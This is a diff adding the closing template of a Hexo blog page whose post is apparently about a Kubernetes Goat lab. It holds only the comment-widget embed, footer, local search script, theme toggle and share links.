+  <!-- Giscus 评论区：基于 GitHub Discussions -->
+  <div class="giscus"></div>
+  <script src="https://giscus.app/client.js"
+          data-repo="x2nn/x2nn.github.io"
+          data-repo-id="R_kgDOMV-gkA"
+          data-category="Announcements"
+          data-category-id="DIC_kwDOMV-gkM4C7iiE"
+          data-mapping="pathname"
+          data-strict="0"
+          data-reactions-enabled="1"
+          data-emit-metadata="0"
+          data-input-position="top"
+          data-theme="preferred_color_scheme"
+          data-lang="zh-CN"
+          data-loading="lazy"
+          crossorigin="anonymous"
+          async>
+  </script>
+
+  <!-- 跟随站点 light/dark 动态切换 Giscus 主题 -->
+  <script>
+    (function () {
+      function currentMode() {
+        return document.documentElement.getAttribute('color-mode') === 'dark' ? 'dark' : 'light';
+      }
+      function postTheme() {
+        var frame = document.querySelector('iframe.giscus-frame');
+        if (!frame) return;
+        frame.contentWindow.postMessage(
+          { giscus: { setConfig: { theme: currentMode() } } },
+          'https://giscus.app'
+        );
+      }
+      new MutationObserver(postTheme).observe(document.documentElement, {
+        attributes: true,
+        attributeFilter: ['color-mode']
+      });
+    })();
+  </script>
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/x2nn">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+              <a title="rss" href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a href="https://x2nn.github.io">Copyright © 2024 - 2026</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B + '&url=' + https%3A%2F%2Fx2nn.github.io%2F2026%2F04%2F04%2Fk8s-goat%25E9%259D%25B6%25E5%259C%25BA%25E7%25BB%2583%25E4%25B9%25A0-%25E4%25B8%258B%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://x2nn.github.io/2026/04/04/k8s-goat%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-%E4%B8%8B/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
